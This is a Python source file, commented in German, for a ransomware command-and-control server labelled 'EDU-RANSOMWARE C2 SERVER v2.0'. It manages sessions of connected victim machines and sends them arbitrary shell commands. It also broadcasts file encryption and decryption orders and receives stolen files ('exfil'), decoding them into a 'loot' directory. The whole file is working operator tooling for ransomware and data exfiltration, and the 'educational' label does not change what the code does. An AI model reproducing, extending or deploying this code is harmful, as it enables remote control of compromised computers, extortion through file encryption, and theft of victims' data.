import socket
import threading
import subprocess
import sys
import os
import base64
import time

from typing import Optional

LOOT_DIR = "loot"


# ANSI Color für Terminal Output
class Colors:
    HEADER = "\033[95m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"


# Clients Connections und IDs speichern
clients = {}
client_id = 0
lock = threading.Lock()


def handle_client(
    client_socket: socket.socket, client_address: tuple[str, int], cid: int
) -> None:
    """
    Verarbeitet eine aktive Client Verbindung in einem eigenen Thread

    Vorgehensweise: wartet in einer Endlosschleife auf eingehende Nachrichten des Clients,
    gibt diese auf der Server-Konsole aus und schließt die Verbindung bei einem Abbruch

    Args:
        client_socket (socket.socket): Das offene Socket-Objekt für die Kommunikation
        client_adress (tuple[str, int]): Die Adresse des Clients, bestehend aus (IP, Port).
        cid (int) : die vom Server vergebenene ID (zur Identifikation)

    Returns:
        None: Keine Return, läuft als Endlosschleife
    """
    print(
        f"{Colors.GREEN}[+] Neue Verbindung: ID {cid} from {client_address}{Colors.ENDC}"
    )
    clients[cid] = client_socket

    try:
        while True:
            # Clientantworten auf befehle erhalten
            data = client_socket.recv(1048576).decode("utf-8", errors="ignore")
            if not data:
                break

            if "EXFIL_DATA" in data:
                try:
                    # Format des Agents: "EXFIL_DATA:<filename>:<base64_string>"
                    prefix, filename, b64_content = data.strip().split(":", 2)

                    if not os.path.exists(LOOT_DIR):
                        os.makedirs(LOOT_DIR)

                    safe_filename = os.path.basename(filename)
                    save_path = os.path.join(LOOT_DIR, safe_filename)

                    # Decode and write
                    with open(save_path, "wb") as f:
                        f.write(base64.b64decode(b64_content))

                    print(
                        f"\n{Colors.GREEN}{Colors.BOLD}[!] DATA STOLEN! Saved to: {save_path}{Colors.ENDC}"
                    )
                    print(f"C2>", end="", flush=True)

                except Exception as e:
                    print(
                        f"\n{Colors.FAIL}[!] Error decoding exfiltrated data: {e}{Colors.ENDC}"
                    )
            else:
                print(f"\n[ID {cid}] Response: \n{data}")
                print("C2>", end="", flush=True)

            print(f"\n[ID {cid}] Response: \n{data}")

    except Exception as e:
        print(f"[!] Fehler mit client ID {cid}: {e}")

    finally:
        with lock:
            del clients[cid]
        client_socket.close()
        print(f"[-] Client ID {cid} discconnected")


def broadcast_command(command: str) -> None:
    """
    Sendet einen Befehl an alle verbundenen Clients (Broadcast)

    Die Funktion iteriert durch alle clients und versucht,
    den Befehl an jeden offenen Socket zu senden.
    Sendefehler werden protokolliert und abgefangen, unterbrechen aber
    nicht den Broadcast an die anderen Clients.

    Args:
        command (str): Befehl, der an die Clients gesendet werden soll.

    Returns:
        None
    """
    with lock:
        for cid, client_socket in clients.items():
            try:
                client_socket.send(command.encode("utf-8"))
                print(f"[+] Befehl an ID {cid} gesendet")
            except Exception as e:
                print(f"[!] Fehler beim senden an {cid}: {e}")


def send_command_to_client(cid: int, command: str) -> None:
    """
    Sendet einen Befehl an einen spezifischen Client (basierend auf seiner ID)

    Überprüft zunächst ob die ID in der Liste der aktiven Connections vorhanden ist.
    Falls ja -> Befehl wird gesendet

    Args:
        cid (int): Die eindeutige ID des Ziel-Clients (Client-ID).
        command (str): Der Befehl, der ausgeführt werden soll (z.B. Shell-Befehle, 'encrypt', etc.)

    Returns:
        None
    """
    with lock:
        if cid in clients:
            try:
                clients[cid].send(command.encode("utf-8"))
                print(f"[+] Befehl an ID {cid} gesendet")
            except Exception as e:
                print(f"{Colors.FAIL}[!] Fehler beim senden an {cid}: {e}{Colors.ENDC}")
        else:
            print(f"{Colors.WARNING}[!] Client ID {cid} nicht gefunden{Colors.ENDC}")


def encrypt_target(cid: int, target_path: str) -> None:
    """
    Konstruiert und sendet den Verschlüsselungsbefehl für einen bestimmten Pfad.

    baut den Befehlsstring im Format `encrypt <Pfad>` zusammen und verwendet für das
    Senden die Funktion `send_command_to_client`.

    Args:
        cid (int): Eindeutige ID des Clients, der verschlüsselt werden soll.
        target_path (str): Der absolute oder relative Pfad auf dem Zielsyste,
                            der rekursiv verschlüsselt werden soll.

    Returns:
        None
    """
    encrypt_command = f"encrypt {target_path}"
    send_command_to_client(cid, encrypt_command)
    print(f"[+] Encrypt Befehl für Pfad '{target_path}' an ID {cid} gesendet")


def decrypt_target(cid: int, target_path: Optional[str] = None) -> None:
    """
    Sendet den Befehl zur Entschlüsselung an einen spezifischen Client

    Wenn ein Pfad angegeben ist, wird `decrypt <path>` gesendet,
    -> Client wird dadurch angewiesen, Dateien in diesem Pfad wiederherzustellen.
    Ohne Pfad wird der Standard-Entschlüsselungsmodus (Root-Verzeichnis der Clients) ausgelöst.

    Args:
        cid (int): Die eindeutige ID des Clients.
        target_path (Optional[str], optional): Spezifischer Pfad, der entschlüsselt werden soll.
            (Default := None).

    Returns:
        None
    """
    if target_path:
        cmd = f"decrypt {target_path}"
        print(f"[+] Decrypt Command für {target_path} and ID {cid}")

    else:
        cmd = "decrypt"
        print(f"[+] Decrypt Command (default) and ID {cid}")

    send_command_to_client(cid, cmd)


def list_sessions() -> None:
    """
    Gibt eine Liste der aktuell verbundenen Client-Sessions aus.

    Iteriert durch das `clients`-Dict (threadsicher) und zeigt die Client-Id und
    (falls verfübar) die IP-Adresse des verbundenen Hosts an.

    Args:
        keine

    Returns:
        None: Ausgabe erfolgt direkt via `print`
    """
    with lock:
        if not clients:
            print("[!] Keine aktiven Sessions")
        else:
            print("[*] Aktive Sessions:")
            for cid in clients:
                try:
                    ip = clients[cid].getpeername()[0]
                    print(f"\t ID {cid} - {ip}")
                except:
                    print(f"\t ID {cid}")


def server_shell():
    """
    Startet die CLI für die Interaktionen mit den Clients (kontrollierend)

    Läuft in einem separaten Thread und verarbeitet Nutzereingaben
    (bspw. `sessions`, `interact` oder `broadcast`
    Schnittstelle zur Steuerung des C2-Server

    Args:
        keine

    Returns:
        None: Läuft in einer Endlosschleife, bis `exit` angegeben wird
    """
    global client_id

    if not os.path.exists(LOOT_DIR):
        os.makedirs(LOOT_DIR)

    print(f"{Colors.BOLD}--- C2 COMMAND CENTER READY ---{Colors.ENDC}")

    while True:
        try:
            cmd = input("C2> ").strip()
        except EOFError:
            break

        if not cmd:
            continue

        if cmd == "sessions":
            list_sessions()

        elif cmd.startswith("interact "):
            try:
                # Versuchen die Client ID aus dem Befehl auszulesen
                cid = int(cmd.split()[1])
                if cid in clients:
                    print(
                        f"{Colors.HEADER}[*] Interacting with ID {cid}. Type 'background' to exit.{Colors.ENDC}"
                    )
                    while True:
                        sub_cmd = input(f"ID {cid} @ Shell> ").strip()
                        if sub_cmd == "background":
                            break
                        elif sub_cmd.startswith("encrypt "):
                            # Encrypt Befehl in der interaktiven Session
                            try:
                                target_path = sub_cmd.split(" ", 1)[1]
                                encrypt_target(cid, target_path)
                            except IndexError:
                                print("[!] Usage: encrypt <target_path>")

                        elif sub_cmd == "decrypt":
                            # Checken ob ein Pfad angegeben wurde
                            parts = sub_cmd.split(" ", 1)
                            if len(parts) == 2:
                                # Mit Pfad
                                decrypt_target(cid, parts[1])
                            else:
                                # Ohne Pfad
                                decrypt_target(cid)

                        elif sub_cmd.startswith("exfil "):
                            send_command_to_client(cid, sub_cmd)
                            print(
                                f"{Colors.WARNING}[*] Waiting for data transfer...{Colors.ENDC}"
                            )

                        elif sub_cmd:
                            send_command_to_client(cid, sub_cmd)
                else:
                    print(f"[!] Client ID {cid} nicht gefunden")
            except (IndexError, ValueError):
                print("[!] Usage: interact <client_id>")

        elif cmd.startswith("encrypt "):
            # Encrypt Befehl mit Client ID
            try:
                parts = cmd.split(" ", 2)
                if len(parts) != 3:
                    print("[!] Usage: encrypt <client_id> <target_path>")
                else:
                    cid = int(parts[1])
                    target_path = parts[2]
                    encrypt_target(cid, target_path)
            except ValueError:
                print("[!] Client ID muss eine Zahl sein")

        elif cmd.startswith("decrypt "):
            try:
                # cmd kann sein: decrypt 1 oder decrypt 1 /tmp/test
                parts = cmd.split(" ", 2)

                if len(parts) == 2:
                    # decrypt <id>
                    cid = int(parts[1])
                    decrypt_target(cid)
                elif len(parts) == 3:
                    # decrypt <id> <path>
                    cid = int(parts[1])
                    path = parts[2]
                    decrypt_target(cid, path)
                else:
                    print("[!] Usage: decrypt <client_id> [optional_path]")

            except ValueError:
                print("[!] Client ID muss eine Zahl sein")

        elif cmd.startswith("broadcast "):
            command = cmd[10:].strip()
            if command:
                if command.startswith("encrypt "):
                    # Broadcast encrypt Befehl
                    try:
                        target_path = command.split(" ", 1)[1]
                        broadcast_command(f"encrypt {target_path}")
                        print(
                            f"[+] Encrypt Befehl für Pfad '{target_path}' an alle Clients gesendet"
                        )
                    except IndexError:
                        print("[!] Usage: broadcast encrypt <target_path>")

                elif command == "decrypt":
                    broadcast_command("decrypt")
                    print("[+] Decrypt Befehl an alle Clients gesendet")

                else:
                    broadcast_command(command)
            else:
                print("[!] Usage: broadcast <command>")

        elif cmd.startswith("exfil "):
            try:
                parts = cmd.split(" ", 2)
                if len(parts) != 3:
                    print(
                        f"{Colors.WARNING}[!] Usage: exfil <client_id> <remote_filepath>{Colors.ENDC}"
                    )
                else:
                    cid = int(parts[1])
                    remote_path = parts[2]
                    send_command_to_client(cid, f"exfil {remote_path}")
                    print(
                        f"{Colors.WARNING}[*] Requesting file '{remote_path}' from Victim {cid}...{Colors.ENDC}"
                    )
            except ValueError:
                print("[!] Client ID muss eine Zahl sein")

        elif cmd == "help":
            print(f"{Colors.HEADER}[*] Verfügbare Befehle:{Colors.ENDC}")
            print("  sessions                    - Zeige alle aktiven Sessions")
            print(
                "  interact <id>               - Interagiere mit einem Client (Shell Mode)"
            )
            print(
                f"  {Colors.BOLD}exfil <id> <remote_path>    - Lade Datei vom Opfer herunter (NEU!){Colors.ENDC}"
            )
            print(
                "  encrypt <id> <path>         - Verschlüssle Pfad auf spezifischem Client"
            )
            print(
                "  decrypt <id> [path]         - Entschlüssle Dateien auf spezifischem Client"
            )
            print("  broadcast <cmd>             - Sende Befehl an alle Clients")
            print("  exit                        - Server beenden")

        elif cmd == "exit":
            print(f"{Colors.FAIL}[!] Shutting down...{Colors.ENDC}")
            with lock:
                for client_socket in clients.values():
                    client_socket.close()
            os._exit(0)
        else:
            print("[!] Unknown command. Type 'help'.")


def main():
    """
    Einstiegspunkt des C2-Server

    Initialisiert den TCP-Socket, bindet ihn an den konfigurierten Port (Default: 4444)
    und startet den Shell-Thread.
    Wartet anschließend in einer Endlosschleife auf Verbindungen (`server.accept`), weist
    neuen Clients eine ID zu und startet für jeden Client einen eigenen Handler-Thread.

    Args:
        keine

    Returns:
        None: Läuft, bis der Server durch KeyboardInterrupt oder den `exit` Befehl gestoppt wird.
    """
    global client_id

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(("0.0.0.0", 4444))
    except OSError as e:
        print(f"{Colors.FAIL}[!] Fehler beim Binden des Ports: {e}{Colors.ENDC}")
        return

    server.listen(5)

    print("[*] C2 Server started on port 4444")
    print(f"{Colors.HEADER}========================================")
    print("    EDU-RANSOMWARE C2 SERVER v2.0")
    print("    SERVER STARTET ON PORT 4444")
    print(f"    Server IP: {socket.gethostbyname(socket.gethostname())}")
    print(f"========================================{Colors.ENDC}")

    # Server Shell in eigenem Threat starten
    threading.Thread(target=server_shell, daemon=True).start()

    try:
        while True:
            conn, addr = server.accept()
            print("Client connected from", addr)
            print("Local IP used for this connection:", conn.getsockname()[0])
            with lock:
                client_id += 1
                client_thread = threading.Thread(
                    target=handle_client,
                    args=(conn, addr, client_id),
                )
                client_thread.daemon = True
                client_thread.start()

    except KeyboardInterrupt:
        print("\n[!] Shutting down Server")
    finally:
        server.close()
        sys.exit(0)


if __name__ == "__main__":
    main()
